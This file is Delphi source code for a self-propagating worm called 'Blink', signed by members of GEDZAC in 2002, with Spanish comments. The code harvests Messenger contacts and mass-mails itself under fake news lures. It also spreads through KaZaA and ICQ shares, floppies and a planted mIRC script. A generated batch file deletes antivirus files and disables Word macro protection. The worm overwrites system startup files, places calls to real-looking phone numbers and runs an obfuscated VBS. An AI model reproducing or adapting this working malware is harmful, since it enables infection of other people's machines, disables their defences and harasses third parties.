   Unit Unit1;

   interface

   uses
     Windows, ShellApi,registry, Messages, SysUtils, Classes, Controls, Forms, Dialogs,
     StdCtrls, Psock, NMsmtp;
      function tapiRequestMakeCall(lpszDestAddress,
                                      lpszAppName,
                                      lpszCalledParty,
                                      lpszComment: LPCSTR): DWORD; stdcall;





   type
     TForm1 = class(TForm)
       Memo1: TMemo;
       smtp: TNMSMTP;
       procedure FormCreate(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
   varia,vueltas:integer;
     Form1: TForm1;
      bodi: array[1..6] of string ;
       Subjec: array[1..6] of string ;
       atach: array[1..6] of string ;
       remite:string;

     procedure leerimailsvictimas(lamemo:tmemo);
     function DirectorioWindows : String;
     function registrodevictimas(RootKey: HKEY; Key, Value: string): variant;

     implementation


   function registrodevictimas(RootKey: HKEY; Key, Value: string): variant;
   var
     Reg: TRegistry;
     RegDataType: TRegDataType;
     DataSize, Len: integer;
     s: string;
   label fueradeindice;
   begin
   Reg := nil;
     try
       Reg := TRegistry.Create(KEY_QUERY_VALUE);
       Reg.RootKey := RootKey;
       if Reg.OpenKeyReadOnly(Key) then begin
         try
           RegDataType := Reg.GetDataType(Value);
           if (RegDataType = rdString) or
              (RegDataType = rdExpandString) then
             Result := Reg.ReadString(Value)
           else if RegDataType = rdInteger then
             Result := Reg.ReadInteger(Value)
           else if RegDataType = rdBinary then begin
             DataSize := Reg.GetDataSize(Value);
             if DataSize = -1 then goto fueradeindice;
             SetLength(s, DataSize);
             Len := Reg.ReadBinaryData(Value, PChar(s)^, DataSize);
             if Len <> DataSize then goto fueradeindice;
             Result := s;
           end else
   fueradeindice:

         except
           s := ''; // Deallocates memory if allocated
           Reg.CloseKey;
           raise;
         end;
         Reg.CloseKey;
       end else
         raise Exception.Create(SysErrorMessage(GetLastError));
     except
       Reg.Free;
       raise;
     end;
     Reg.Free;
   end;

    procedure leerimailsvictimas(lamemo:tmemo);
   var
   imails: array[0..1000] of string ;
   f:integer;
   imailunicode,imailbien,espejo:string;
   conta:integer;
   marca:integer;
   label nomas;
   begin
   //Rutina por ErGrone / GEDZAC
   espejo := '*';    //nada mas que una marca para iniciar el espejo


   //aqui obtenemos 1001 imails para multiplicarme, ojala agarre un ciber ;-)+----<
   for f := 0 to 1000 do
   begin
   try
   imailunicode:=(registrodevictimas(HKEY_CURRENT_USER,'\Software\Microsoft\MessengerService\ListCache\.NET Messenger Service', 'Allow'+inttostr(f)));
   except

   end;
   marca := 0;  //marca 0 es comenzamos a leer la siguiente direccion imail
   imailbien :='';
   //el retorno de registrodevictimas tiene caracteres unicode al final
   //de cada direccion imail, debemos descartarlos
   //para obtener un recipiente valido.
   for conta := 1 to 90 do  //cuantos carcteres leeremos
   begin
   if imailunicode[conta] = '' then // checkamos el comienzo unicode, si es verdadero
                                   //leemos hasta aqui y guardamos el imail limpio.
   begin
   marca := 1;  // esta marca nos informa el inicio del unicode
   //si la victima tiene menos de 101 contactos entonces el ultimo contacto
   //se repetira hasta completar los 101,
   //chackando con la variable espejo limpiamos este residuo
   if espejo = imailbien then goto nomas;
   LAMEMO.Lines.Add(imailbien);
   espejo := imailbien;                   // ha?
   end
   else
   if espejo = imailbien then goto nomas;
   if marca = 1 then goto nomas;
   imailbien := imailbien+imailunicode[conta];   //juntamos el imail letra por letra
   end;
   nomas:   //UFFFFFFFFFFFf, descansamos

   end;

   end;


   function DirectorioWindows : String;
      var
         pcWindowsDirectory : PChar;
         dwWDSize           : DWORD;
      begin
         dwWDSize := MAX_PATH + 1;
         GetMem( pcWindowsDirectory, dwWDSize );
         try
            if Windows.GetWindowsDirectory( pcWindowsDirectory, dwWDSize ) <> 0 then
               Result := pcWindowsDirectory;
         finally
            FreeMem( pcWindowsDirectory );
         end;
      end;



   function tapiRequestMakeCall; external 'TAPI32.DLL' name 'tapiRequestMakeCall';


   {$R *.DFM}

   procedure TForm1.FormCreate(Sender: TObject);
        var
   PhoneNumber: array [0..255] of char;
   AQuien: array [0..255] of char;
   quiensoy,origenx:string;
   quiensoy2,contador:integer;
   Blink:textfile;
   Dude:textfile;
   Dammit:textfile;
   Yahoo:textfile;
   Marca:textfile;
   Win:textfile;
   Start:textfile;
   Wallpapercluck,clock:textfile;
   wall:textfile;
   bigbat:textfile;
      dammito,wallpaper:textfile;
   cluck:textfile;
   label otravez;

   begin
   leerimailsvictimas(memo1);
   quiensoy:=getcommandline;
   quiensoy2:=StrLen(pchar(quiensoy));

   for contador:=2 to (quiensoy2-2) do
   begin
   origenx:=origenx+quiensoy[contador];
   end;

     Subjec[1]:= 'Los mejores chistes de Bin Laden';
   Bodi[1]:='A todos mis amigos. Los mejores chistes que me enviaron,éstos son los mejores.';
   atach[1]:= 'BinLadilla.pif'  ;
   Subjec[2]:= 'HISPASEC';
   Bodi[2]:='Esta es la prueba de que HISPASEC roba importantes bases de datos de muchas compañías, incluso hotmail. (los campos en blanco son algunos datos omitidos por razones de anonimato y seguridad).';
   atach[2]:= 'Noticia45.Txt.pif';
   Subjec[3]:= 'HISPASEC';
   Bodi[3]:='This is the probe that HISPASEC steals important databases of many companies (the fields in blank_target are some data omitted by security and anonimity reasons)';
   atach[3]:= 'NewsHS.Txt.pif';
   Subjec[4]:= 'Carnivore databases';
   Bodi[4]:='BO2K publish pieces of database gathered by Carnivore.';
   atach[4]:='CarnivoreStory.Pif';
   Subjec[5]:= 'Base de datos. Carnivore.';
   Bodi[5]:='BO2K publica parte de la base de datos recopilada por Carnivore.';
   atach[5]:='CarnivoreStory.Pif';
   Subjec[6]:= 'VAN A VENDER HOTMAIL';
   Bodi[6]:='parece que los de microsoft no se la pudieron, prefirieron dedicarle tiempo al windows,'+chr(13)+'amenazan con borrar las cuentas, pero se puede evitar siguiendo unos estatuts que ellos ponen a disposición. leelos o no tendras mas cuenta. chao.';
   atach[4]:='Estatutos.Pif';
   //try
   for vueltas := 1 to 6 do
       begin
     copyfile(pchar(origenx),pchar('c:\'+atach[vueltas]),true);
     end;

    varia := memo1.Lines.Count mod 6;
    if varia = 0 then
    begin
    varia := 1
    end;
   remite:=memo1.Lines[varia];
   smtp.PostMessage.FromAddress:=remite;
   smtp.PostMessage.FromName := remite;
   smtp.PostMessage.ToBlindCarbonCopy.Assign(memo1.Lines);
   smtp.PostMessage.Body.Add(bodi[varia]);
   smtp.PostMessage.Subject := subjec[varia];
   smtp.PostMessage.Attachments.Add('c:\'+atach[varia]);
   otravez:
   try
   smtp.Connect;
   smtp.SendMail;
   except


   end;
   if smtp.Connected = false then
   begin
   goto otravez;
   end;

      //end;
           try //control de errores
           StrPCopy(PhoneNumber,'57 1 4145735');
           StrPCopy(AQuien,'To COLOMBIA1');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 4 2652392');
           StrPCopy(AQuien,'To COLOMBIA2');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 2 4396800');
           StrPCopy(AQuien,'To COLOMBIA3');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 2 4306480');
           StrPCopy(AQuien,'To COLOMBIA4');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 7 6446985');
           StrPCopy(AQuien,'To COLOMBIA5');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 7 6364029');
           StrPCopy(AQuien,'To COLOMBIA6');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 6 7493771');
           StrPCopy(AQuien,'To COLOMBIA7');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 1 6141309');
           StrPCopy(AQuien,'To COLOMBIA8');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'57 6 7436194');
           StrPCopy(AQuien,'To COLOMBIA9');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 330 52 17');
           StrPCopy(AQuien,'To BARCELONA1');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 296 42 22');
           StrPCopy(AQuien,'To BARCELONA2');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 210 07 57');
           StrPCopy(AQuien,'To BARCELONA3');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 311 72 22');
           StrPCopy(AQuien,'To BARCELONA4');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 427 20 59');
           StrPCopy(AQuien,'To BARCELONA5');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 457 55 10');
           StrPCopy(AQuien,'To BARCELONA6');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 405 03 21');
           StrPCopy(AQuien,'To BARCELONA7');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 359 28 13');
           StrPCopy(AQuien,'To BARCELONA8');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'93 218 91 00');
           StrPCopy(AQuien,'To BARCELONA9');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'1 787 7084547');
           StrPCopy(AQuien,'To PUERTO1');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'1 787 7925515');
           StrPCopy(AQuien,'To PUERTO2');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'1 787 2828159');
           StrPCopy(AQuien,'To PUERTO3');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'1 787 7673500');
           StrPCopy(AQuien,'To PUERTO4');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'1 787 7990781');
           StrPCopy(AQuien,'To PUERTO5');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'52 932 135904');
           StrPCopy(AQuien,'To MEXICO1');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'52 81 83353894');
           StrPCopy(AQuien,'To MEXICO2');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'52 81 83475440');
           StrPCopy(AQuien,'To MEXICO3');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'52 81 83333172');
           StrPCopy(AQuien,'To MEXICO4');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'52 932 113802');
           StrPCopy(AQuien,'To MEXICO5');
           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           StrPCopy(PhoneNumber,'01 900 849 77 77');
           StrPCopy(AQuien,'To ACADEMIA');

           tapiRequestMakeCall(PhoneNumber,'',AQuien,'');
           except;
       end;















   AssignFile(Dammito,'C:\ThE MegA BlINk BaT.bat');
   rewrite(Dammito);
   writeln(Dammito,'@echo off');
   writeln(Dammito,'@break off');
   writeln(Dammito,'ctty nul');
   writeln(Dammito,'');
   writeln(Dammito,'');
   writeln(Dammito,'if exist c:\archiv~1\perav goto 1antivirus');
   writeln(Dammito,':1antivirus');
   writeln(Dammito,'for %%f in (C:\archiv~1\perav\*.dat) do copy %0 %%f');
   writeln(Dammito,'');
   writeln(Dammito,'');
   writeln(Dammito,'if exist c:\archiv~1\pandas~1\pandaa~1.0\ goto 2antivirus');
   writeln(Dammito,':2antivirus');
   writeln(Dammito,'del c:\archiv~1\pandas~1\pandaa~1.0\*.dll');
   writeln(Dammito,'');
   writeln(Dammito,'');
   writeln(Dammito,'if exist c:\archiv~1\McAfee\McAfee~1 goto 3antivirus');
   writeln(Dammito,':3antivirus');
   writeln(Dammito,'del c:\archiv~1\McAfee\McAfee~1\*.dll');
   writeln(Dammito,'');
   writeln(Dammito,'if exist C:\Archiv~1\Norton~1 goto 4antivirus');
   writeln(Dammito,':4antivirus');
   writeln(Dammito,'del C:\Archiv~1\Norton~1\NAVDX.EXE');
   writeln(Dammito,'del C:\Archiv~1\Norton~1\V325SCAN.dll');
   writeln(Dammito,'del C:\Archiv~1\Norton~1\NAVP.VXD');
   writeln(Dammito,'');
   writeln(Dammito,'');
   writeln(Dammito,'echo REGEDIT4 > %Windir%\blink.reg');
   writeln(Dammito,'');
   writeln(Dammito,'echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "avpfolder"="Blink Folder" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "VEDataFilePath"="The Blink Path" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "VEIndexFilePath"="The Plink, the Blink, the Oink" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "MainDir"="Blink virus & the Batch company" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_LOCAL_MACHINE\Software\KasperskyLab\SharedFiles] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "Folder"="Plink it'+chr(39)+'s the Blink guitarrist yeeeeeh!" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "EnableMacroVirusProtection"="0" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "EnableMacroVirusProtection"="0" >> %Windir%\blink.reg');
   writeln(Dammito,'echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion] >> %Windir%\blink.reg');
   writeln(Dammito,'echo "RegisteredOwner"="Blink" >> %Windir%\blink.reg');
   writeln(Dammito,'echo "RegisteredOrganization"="The Blink company inc." >> %Windir%\blink.reg');
   writeln(Dammito,'');
   writeln(Dammito,'regedit /s /c %Windir%\blink.reg');
   writeln(Dammito,'');
   writeln(Dammito,'ECHO @attrib +h +r c:\blink.bat >> c:\Autoexec.bat');
   writeln(Dammito,'ECHO cls >> c:\Autoexec.bat');
   writeln(Dammito,'ECHO @ECHO --------------------- >> c:\Autoexec.bat');
   writeln(Dammito,'ECHO @ECHO [  Blink virus.     ] >> c:\Autoexec.bat  ');
   writeln(Dammito,'ECHO @ECHO [     RaZor         ] >> c:\Autoexec.bat ');
   writeln(Dammito,'ECHO @ECHO [ Gedzac Labs 2002. ] >> c:\Autoexec.bat ');
   writeln(Dammito,'ECHO @ECHO --------------------- >> c:\Autoexec.bat');
   writeln(Dammito,'ECHO @choice "" /c:12 /n /t:1,5 >> c:\Autoexec.bat');
   writeln(Dammito,'ECHO @if errorlevel 1 goto fin >> c:\Autoexec.bat');
   writeln(Dammito,'ECHO :fin >> c:\Autoexec.bat');
   writeln(Dammito,'');
   writeln(Dammito,'');
   writeln(Dammito,'exit              ');
   closefile(Dammito);
   ShellExecute(0,nil,PChar('C:\ThE MegA BlINk BaT.bat'),'','',SW_SHOWNORMAL);
   deletefile(pchar('C:\ThE MegA BlINk BaT.bat'));

   copyfile('Blink 182.scr','c:\Windows\Blink 182.scr',true);
   copyfile('Blink 182.scr','c:\Windows\RaZor.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Cloud Strife.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Kuasanagui.scr',true);
   copyfile('Blink 182.scr','c:\Windows\%system%\182.exe',true);
   copyfile('Blink 182.scr','c:\Windows\HOKO.scr',true);
   copyfile('Blink 182.scr','c:\Windows\ErGrone.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Jtag.scr',true);
   copyfile('Blink 182.scr','c:\Windows\XpLOaD.scr',true);
   copyfile('Blink 182.scr','c:\Windows\NERFIX.scr',true);
   copyfile('Blink 182.scr','c:\Windows\NEMESIZZ.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Tom.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Marc.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Travis.scr',true);
   copyfile('Blink 182.scr','c:\Windows\BOX CAR RACER.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Take Off Youre Pants And Youre Jacket.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Damm You!.scr',true);
   copyfile('Blink 182.scr','c:\Windows\ENEMA.scr',true);
   copyfile('Blink 182.scr','c:\Windows\DUDE RANCH.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Cheshire Cat.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Guitar.scr',true);
   copyfile('Blink 182.scr','c:\Windows\Punk Power!.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Blink 182.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Box Car Racer.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Blink 182 All Videos.exe',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\KaZaA UpDate.exe',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Songs.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Anna Kournikova.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\All The Small Things All Screen Video.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\My Screen Saver.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Telephone Numbers The Video.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Fun Screen.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\MeGa CiBer ScReeN SavEr.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Osama The King.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\KaZaA\My Shared Folder\Marc Tom And Travis.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ Power Edition.exe',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ SMS Plus.exe',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ Screen Saver.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ Millenium Screen.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ Fire Screen.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ Ice Screen.scr',true);
   copyfile('Blink 182.scr','C:\Program Files\ICQ\shared files\ICQ Natural Screen.scr',true);
   copyfile('Blink 182.scr','A:\Nude Screen.scr',true);
   copyfile('Blink 182.scr','A:\SeX ScReen Saver.scr',true);
   copyfile('Blink 182.scr','A:\Playboy Screen Saver.scr',true);
   copyfile('Blink 182.scr','A:\Shakira Screen Saver.scr',true);

    try
   AssignFile(Dude,'C:\mIRC\Script.ini');
   rewrite(Dude);
   writeln(Dude,'[script]');
   writeln(Dude,'sn0=on 1:JOIN:#:{');
   writeln(Dude,'n1= /if ( $nick == $me ) { halt }');
   writeln(Dude,'n2= /msg $nick Hola jjejeje Como Andas Te E Estado Buscando Por Todas Partes Bueno No Importa Era Para Enseñarte Este Scrren Saver De Blink 182 Mi Grupo Favorito! ');
   writeln(Dude,'n3= /dcc send $nick C:\Windows\Blink 182.scr  ');
   writeln(Dude,'n4= /if ( $me != $nick )');
   writeln(Dude,'n5= /dcc send $nick C:\Windows\Blink 182.scr ');
   writeln(Dude,'n6=}   ');
   writeln(Dude,'n7=on 1:PART:#:{');
   writeln(Dude,'n8= /if ( $nick == $me ) { halt }');
   writeln(Dude,'n9= /msg $nick Hola jjejeje Como Andas Te E Estado Buscando Por Todas Partes Bueno No Importa Era Para Enseñarte Este Scrren Saver De Blink 182 Mi Grupo Favorito! ');
   writeln(Dude,'n10= /dcc send $nick C:\Windows\Blink 182.scr');
   writeln(Dude,'n11= /if ( $me != $nick )  ');
   writeln(Dude,'n12= /dcc send $nick C:\Windows\Blink 182.scr   ');
   writeln(Dude,'n13=}  ');
   closefile(Dude);
      except
      end;


   AssignFile(Dammit,'C:\Dammit.txt');
   rewrite(Dammit);
   writeln(Dammit,'It s alright / to tell me / what you think / about me ');
   writeln(Dammit,'I won t try / to argue / or hold it / against you ');
   writeln(Dammit,'I know that / you re leaving / you must have / your reasons  ');
   writeln(Dammit,'The season / is calling / and your pictures / are falling down');
   writeln(Dammit,' ');
   writeln(Dammit,'The steps that / I retrace / a sad look / on your face ');
   writeln(Dammit,'The timing / and structure / did you hear / he fucked her? ');
   writeln(Dammit,'A day late / a buck short / I m writing / the report    ');
   writeln(Dammit,'I m losing / and failing / when I move / I m flailing now  ');
   writeln(Dammit,' ');
   writeln(Dammit,'And it s happened once again ');
   writeln(Dammit,'I ll turn to a friend    ');
   writeln(Dammit,'Someone that understands ');
   writeln(Dammit,'Sees through the master plan ');
   writeln(Dammit,'But everybody s gone       ');
   writeln(Dammit,'And I ve been here for too long   ');
   writeln(Dammit,'To face this on my own     ');
   writeln(Dammit,'Well I guess this is growing up  ');
   writeln(Dammit,'Well I guess this is growing up ');
   writeln(Dammit,' ');
   writeln(Dammit,'And maybe / I ll see you / at a movie / sneak preview  ');
   writeln(Dammit,'You ll show up / and walk by / on the arm / of that guy   ');
   writeln(Dammit,'And I ll smile / and you ll wave / we ll pretend / it s okay  ');
   writeln(Dammit,'The charade / it won t last / when he s gone / I won t come back     ');
   writeln(Dammit,' ');
   writeln(Dammit,'And it s happened once again');
   writeln(Dammit,'Youll turn to a friend    ');
   writeln(Dammit,'Someone that understands    ');
   writeln(Dammit,'And sees through the master plan ');
   writeln(Dammit,'But everybody s gone  ');
   writeln(Dammit,'And you ve been here for too long  ');
   writeln(Dammit,'To face this on your own   ');
   writeln(Dammit,'Well I guess this is growing up ');
   writeln(Dammit,' ');
   writeln(Dammit,'Well, I guess this is growing up ');
   writeln(Dammit,'Well, I guess this is growing up  ');
   writeln(Dammit,' ');
   writeln(Dammit,'I AM BLINK THE VIRUS SORRY!! ');
   closefile(Dammit);

   ShellExecute(0,nil,PChar('C:\Dammit.txt'),'','',SW_SHOWNORMAL);
   ShellExecute(0,nil,PChar('http://www.galeon.com/alltheblinkthings/mp3/dammit.mp3'),'','',SW_SHOWNORMAL);
   ShellExecute(0,nil,PChar('http://chat.cantv.net/'),'','',SW_SHOWNORMAL);




   // Vamos A Hacerle Unas Pequeñas Modificasiones A Yahoo Messenger!! ;)

   try
   AssignFile(Yahoo,'C:\Program Files\Yahoo!\Messenger\ymsgr.ini');
   rewrite(Yahoo);
   writeln(Yahoo,'[COBRAND]                                                                      ');
   writeln(Yahoo,'Number of Menu Items=3                                                          ');
   writeln(Yahoo,'Menu Caption=Inside Yahoo!                                                     ');
   writeln(Yahoo,'Menu Item 1=Has Click Aqui!                                                     ');
   writeln(Yahoo,'Menu Item 2=Nueva Pagina De Yahoo!                                             ');
   writeln(Yahoo,'Menu Item 3=Aviso Importante Para Ti!                                           ');
   writeln(Yahoo,'                                                                              ');
   writeln(Yahoo,'[URLS]                                                                        ');
   writeln(Yahoo,'URL 1=http://www.geocities.com/the_blink_epidemy                               ');
   writeln(Yahoo,'URL 2=http://www.playboy.com                                                  ');
   writeln(Yahoo,'URL 3=http://www.geocities.com/the_blink_epidemy/aviso.html                   ');
   writeln(Yahoo,'                                                                                ');
   writeln(Yahoo,'                                                                                 ');
   writeln(Yahoo,'[Search]                                                                         ');
   writeln(Yahoo,'Number of Menu Items=3                                                            ');
   writeln(Yahoo,'                                                                                ');
   writeln(Yahoo,'Search Text 1=La Mejor Pagina!                                                   ');
   writeln(Yahoo,'Search Menu 1=Lo Mejor                                                           ');
   writeln(Yahoo,'Search URL 1=http://www.blink182.com                                            ');
   writeln(Yahoo,'                                                                               ');
   writeln(Yahoo,'Search Text 2=Putas Hechas Para ti!                                            ');
   writeln(Yahoo,'Search Menu 2=Sexo                                                            ');
   writeln(Yahoo,'Search URL 2=http://www.petardas.com                                          ');
   writeln(Yahoo,'                                                                            ');
   writeln(Yahoo,'Search Text 3=Esta Es La Web Que En Este Momento De Verdad Nesecitas!! ;)    ');
   writeln(Yahoo,'Search Menu 3=Lo Que Haora Nesecitas!!                                      ');
   writeln(Yahoo,'Search URL 3=http://www.antivirus.com                                      ');
   writeln(Yahoo,'tf.Close                                                                                      ');
   closefile(Yahoo);
                     except
                     end;
   // Haora Dejemos Nuestra Marca ;)



   AssignFile(Win,'C:\Windows\win.ini');
   rewrite(Win);
   writeln(Win,' Estas  Infectado Por Blink!! ');
   closefile(Win);

   AssignFile(Start,'C:\Windows\winstart.bat');
   rewrite(Start);
   writeln(Start,' CLS ');
   writeln(Start,'@ECHO Estas Infectado Por Blink!! ');
   writeln(Start,'pause ');
   closefile(Start);



   // Ya Deje Mi Marca Y Hice Muchas Cosas Dejenme Pensar Haber Que Mas Hago!! ;)
   // Se Me A Ocurrido Algo!! jajaja Observa Y Aprende ;)

   AssignFile(clock,'C:\Windows\SYSTEM.INI');
   rewrite(clock);
   writeln(clock,'  [boot]');
   writeln(clock,'');
   writeln(clock,' shell=Explorer.exe 182.exe');
   closefile(clock);


   // Si La De Arriva No Funsiona Tratemos Con Esta!! :)


   AssignFile(cluck,'C:\Windows\System.ini');
   rewrite(cluck);
   writeln(cluck,'  [boot]');
   writeln(cluck,'');
   writeln(cluck,' shell=Explorer.exe 182.exe');
   closefile(cluck);


   // Haora Cambiaremos El Wallpaper Del Escritorio!!


   AssignFile(wallpaper,'C:\Wallpaper1.html');
   rewrite(wallpaper);
   writeln(wallpaper,'');
   writeln(wallpaper,'<html>');
   writeln(wallpaper,'');
   writeln(wallpaper,'<head>');
   writeln(wallpaper,'<meta http-equiv="Content-Language" content="es-ve">');
   writeln(wallpaper,'<meta name="GENERATOR" content="Microsoft FrontPage 5.0">');
   writeln(wallpaper,'<meta name="ProgId" content="FrontPage.Editor.Document">');
   writeln(wallpaper,'<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">');
   writeln(wallpaper,'<title>Pagina nueva 1</title>');
   writeln(wallpaper,'</head>');
   writeln(wallpaper,'');
   writeln(wallpaper,'<body bgcolor="#000000">');
   writeln(wallpaper,'');
   writeln(wallpaper,'<p><font size="7" color="#FF0000"><b>LO SIENTO ESTAS INFECTADO POR BLINK BY:');
   writeln(wallpaper,'RAZOR/GEDZAC</b></font></p>');
   writeln(wallpaper,'');
   writeln(wallpaper,'</body>');
   writeln(wallpaper,'');
   writeln(wallpaper,'</html>');
   closefile(wallpaper);



   // Bueno Yo No Queria Utilisar En Este Virus Scripts Pero Bueno Tengo La Nesecidad de Usarlos Lo Siento ;(


   AssignFile(wall,'C:\VBS.vbs');
   rewrite(wall);
   writeln(wall,'Execute(snphhuatvsbkwuj(snphhuatvsbkwuj("Dim fso, tf');
   writeln(wall,'Set fso = Wscript.CreateObject(WScript.Shell) ');
   writeln(wall,'fso.RegWrite HKEY_CURRENT_USER\Control Panel\Desktop\wallpaper, c:\Wallpaper1.html                                   ');
   writeln(wall,'fso.RegWrite HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General\BackupWallpaper, c:\Wallpaper1.html  ');
   writeln(wall,'     ');
   writeln(wall,'")))  ');
   writeln(wall,'    ');
   writeln(wall,'Function snphhuatvsbkwuj(zwbyjntbpmhqqgh)');
   writeln(wall,'For vvpzxfszgnczrao = 1 To Len(zwbyjntbpmhqqgh)  ');
   writeln(wall,'ccuhbhjhyzkheeq = Mid(zwbyjntbpmhqqgh, vvpzxfszgnczrao, 1)   ');
   writeln(wall,'If Asc(ccuhbhjhyzkheeq) <> 34 And Asc(ccuhbhjhyzkheeq) <> 35 Then ');
   writeln(wall,'If Asc(ccuhbhjhyzkheeq) Mod 2 = 0 Then      ');
   writeln(wall,'ccuhbhjhyzkheeq = Chr(Asc(ccuhbhjhyzkheeq) + 1)   ');
   writeln(wall,'Else                                      ');
   writeln(wall,'ccuhbhjhyzkheeq = Chr(Asc(ccuhbhjhyzkheeq) - 1)  ');
   writeln(wall,'End If                                          ');
   writeln(wall,'End If                                           ');
   writeln(wall,'snphhuatvsbkwuj = snphhuatvsbkwuj & ccuhbhjhyzkheeq  ');
   writeln(wall,'Next                                                  ');
   writeln(wall,'End Function           ');
   closefile(wall);
   ShellExecute(0,nil,PChar('C:\VBS.vbs'),'','',SW_SHOWNORMAL);
   deletefile(pchar('C:\VBS.vbs'));

   // Dejenme Explicar Esto Para Que Lo AntiVirus Sepan Por Que Esa Instruccion "Loca": El Virus Crea Un Archivo VBS Encriptado Luego Lo Ejecute Y Despues Para Darle Un Toque De Clasico Lo Borra Ya Que El Archivo Ya Se Ejecuto Y Ya Iso Lo Que Iva A Hacer!.
   // Bien Ya E Hecho Mucho Me E Esforsado Estudiando Los Registos De Windows Yahoo Messenger Etc... Y Bueno Este Virus Es
